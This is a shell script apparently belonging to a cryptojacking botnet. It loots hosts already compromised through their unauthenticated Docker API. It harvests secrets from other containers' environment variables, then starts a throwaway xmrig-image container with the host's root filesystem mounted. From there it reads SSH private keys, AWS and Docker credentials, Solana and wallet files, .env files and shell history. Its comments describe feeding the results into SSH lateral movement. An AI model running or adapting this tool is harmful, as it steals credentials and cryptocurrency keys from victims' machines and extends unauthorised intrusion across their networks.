#!/bin/sh
# ============================================================================
# dockloot.sh - read what the hosts we already hold are holding, from OUTSIDE,
# through the same unauthenticated docker API we infected them with. No agent,
# no exploit, no ssh needed: a dockerd on :2375 is already root on that host.
#
# This is the missing link for loot.sh. loot.sh reads the SSH trust graph and
# writes loot.txt triples for hunt.sh to probe - but it has to RUN somewhere with
# a shell. dockloot.sh gets you the first one: the keys, cloud creds and .env
# files out of a box we can only reach over its docker API. Feed what it finds
# into the existing pipeline and box1 can ssh in, at which point loot.sh takes
# over and walks the trust graph.
#
# READ-ONLY on purpose: one throwaway container per host, host root mounted :ro,
# output read back through /logs, container deleted. Nothing written, nothing on
# their side invalidated, so a mistake costs nothing.
#
# Tier 0 costs NO container and comes first: every OTHER container's Env leaks its
# stack's secrets (PRIVATE_KEY=, MNEMONIC=, DB URLs, RPC/exchange tokens).
#
# Measured: create WITH a bind mount is slow on a loaded box (>25 s on a host
# running 39 containers, while a plain create is instant) - hence the long timeout
# and one retry. That timeout was the only thing between the probe and the loot.
#
# usage: dockloot.sh [ip ...]    (no args = every host we hold; fixtures skipped)
# ============================================================================
cd "${SYSDIR:-/tmp/.sysd}/.hunt" 2>/dev/null || cd "$(dirname "$0")/.hunt" 2>/dev/null || exit 1
OUT=loot; mkdir -p "$OUT" 2>/dev/null
TAGIMG=${DOCK_IMAGE:-xmrig/xmrig}

CMD1='echo ==UNAME; uname -a; echo ==ROOTLS; ls -la /h/root 2>/dev/null | head -25; echo ==SSH; ls -la /h/root/.ssh 2>/dev/null; echo ==IDRSA; head -c 140 /h/root/.ssh/id_rsa 2>/dev/null; echo; echo ==AWS; cat /h/root/.aws/credentials 2>/dev/null; echo; echo ==DOCKERCFG; head -c 500 /h/root/.docker/config.json 2>/dev/null; echo; echo ==SOLANA; head -c 120 /h/root/.config/solana/id.json 2>/dev/null; echo; echo ==COMPOSE; find /h/opt /h/srv /h/app /h/home /h/root /h/var/www -maxdepth 4 -name docker-compose.yml 2>/dev/null | head -8; echo ==ENVFILES; find /h/opt /h/srv /h/app /h/home /h/root /h/var/www -maxdepth 4 -name .env 2>/dev/null | head -8; echo ==WALLETISH; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name wallet.dat 2>/dev/null | head -5; echo ==KEYFILES; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name *.keys 2>/dev/null | head -6; echo ==PEMS; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name *.pem 2>/dev/null | head -6; echo ==HISTORY; tail -c 400 /h/root/.bash_history 2>/dev/null; echo; echo ==END'
# The findings are also written to a file INSIDE the container, because /logs answers
# empty on a big slice of this population (old engines and api proxies - the repo's own
# note says so, and it bit us on the first run). With the loot on the container's own
# filesystem there is a read path that needs no /logs at all: GET /containers/<id>/export
# streams the filesystem and box1's tar pulls the file out.
CMD1X="($CMD1) > /loot.txt 2>&1; echo ==FROMFILE; cat /loot.txt"

loot1() {
    ip=$1; u="http://$ip:2375"
    v=$(curl -sS -m 6 "$u/version" 2>/dev/null) || v=""
    case "$v" in *ApiVersion*) ;; *) echo "$ip no-api"; return 0 ;; esac
    echo "--- TIER0: their other containers' env (no new container)"
    for cid in $(curl -sS -m 8 "$u/containers/json?all=1" 2>/dev/null | tr -d '\r\n' \
                 | sed 's/": /":/g' | grep -o '"Id":"[0-9a-f]\{40,\}"' | cut -d'"' -f4 | head -14); do
        cj=$(curl -sS -m 6 "$u/containers/$cid/json" 2>/dev/null) || cj=""
        im=$(printf '%s' "$cj" | grep -o '"Image":"[^"]*"' | head -1 | cut -d'"' -f4)
        ss=$(printf '%s' "$cj" | grep -o '"Status":"[^"]*"' | head -1 | cut -d'"' -f4)
        printf '  [%s] %s\n' "${ss:-?}" "${im:-?}"
        printf '%s' "$cj" | sed 's/": /":/g' | grep -o '"Env":\[[^]]*\]' | head -1 | tr ',' '\n' \
          | grep -i -e KEY -e SECRET -e TOKEN -e PASS -e MNEM -e SEED -e PRIV -e RPC -e WALLET -e ADMIN \
          | cut -c1-150 | sed 's/^/     /' | head -6
    done
    echo "--- TIER1: their root filesystem as root (throwaway, no pull, deleted after)"
    body="{\"Image\":\"$TAGIMG\",\"Entrypoint\":[\"/bin/sh\",\"-c\"],\"Cmd\":[\"$CMD1X\"],\"HostConfig\":{\"Binds\":[\"/:/h:ro\"],\"NetworkMode\":\"host\"}}"
    lid=""; n=0
    while [ "$n" -lt 2 ] && [ -z "$lid" ]; do
        n=$((n + 1))
        # unique name per run: a killed run can leave an exited throwaway behind, and a
        # taken name makes create answer 409 WITHOUT an Id - so the loot would silently
        # report "create failed" forever. Per-pid names can never collide with a corpse.
        nm="lk$$$n"
        r=$(curl -sS -m 90 -X POST -H 'Content-Type: application/json' -d "$body" \
             "$u/containers/create?name=$nm" 2>/dev/null) || r=""
        lid=$(printf '%s' "$r" | grep -o '"Id":"[0-9a-f]\{20,\}"' | head -1 | cut -d'"' -f4)
        [ -n "$lid" ] || echo "  create try $n ($nm) failed: $(printf '%s' "$r" | head -c 110)"
    done
    if [ -n "$lid" ]; then
        sb=$(curl -sS -m 45 -X POST "$u/containers/$lid/start" 2>&1) || sb="start-error"
        sleep 3
        ec=$(curl -sS -m 8 "$u/containers/$lid/json" 2>/dev/null | grep -o '"ExitCode":[0-9-]*' | head -1 | cut -d: -f2)
        out=$(curl -sS -m 25 "$u/containers/$lid/logs?stdout=1&stderr=1" 2>/dev/null | tr -d '\000\r')
        how=logs
        if [ -z "$out" ]; then
            out=$(curl -sS -m 25 -X POST \
                  "$u/containers/$lid/attach?stdout=1&stderr=1&logs=1&stream=0" 2>/dev/null | tr -d '\000\r')
            how=attach
        fi
        if [ -z "$out" ]; then
            out=$(curl -sS -m 60 "$u/containers/$lid/export" 2>/dev/null \
                  | tar -xO loot.txt 2>/dev/null | tr -d '\000\r')
            [ -n "$out" ] || out=$(curl -sS -m 60 "$u/containers/$lid/export" 2>/dev/null \
                  | tar -xO ./loot.txt 2>/dev/null | tr -d '\000\r')
            how=export
        fi
        printf '%s\n' "$out"
        echo "  (read=$how exit=${ec:-?} id=$lid)"
        [ -z "$out" ] && echo "  start said: $(printf '%s' "$sb" | head -c 100)"
        curl -sS -m 25 -X DELETE "$u/containers/$lid?force=1" >/dev/null 2>&1
    fi
}

[ -f dock.mock ] || touch dock.mock
if [ "$#" -gt 0 ]; then
    for ip in "$@"; do echo "===== $ip"; loot1 "$ip"; echo; done
    exit 0
fi
for ip in $(cat dock.owned dock.live 2>/dev/null | cut -f1 | sort -u); do
    case "$ip" in [0-9]*.[0-9]*.[0-9]*.[0-9]*) ;; *) continue ;; esac
    grep -qxF "$ip" dock.mock 2>/dev/null && continue     # fixtures lie about everything
    echo "===== $ip"
    loot1 "$ip" | tee "$OUT/$ip.txt"
    echo
done
